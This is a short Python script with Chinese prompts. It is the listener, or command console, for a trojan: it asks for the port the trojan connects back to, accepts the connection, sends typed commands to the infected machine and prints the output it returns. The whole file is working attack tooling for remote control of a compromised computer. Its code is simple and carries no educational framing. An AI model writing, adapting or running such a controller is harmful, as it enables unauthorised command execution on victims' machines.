import socket

local_ip = socket.gethostbyname(socket.gethostname())
print("本机IP地址:", local_ip)

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', int(input("输入木马连接的端口号："))))
server_socket.listen(5)

while True:
    client_socket, client_address = server_socket.accept()
    print("连接地址: %s" % str(client_address))
    print("===输入cmdexit退出===")
    while True:
        send_data = input("GOGOGO>>>")
        if send_data == "exit":
            print("退出")
            client_socket.close()
            break
        else:
            client_socket.send(send_data.encode('utf-8'))
            recv_data = client_socket.recv(2048)
            print(recv_data.decode('utf-8'))
    break
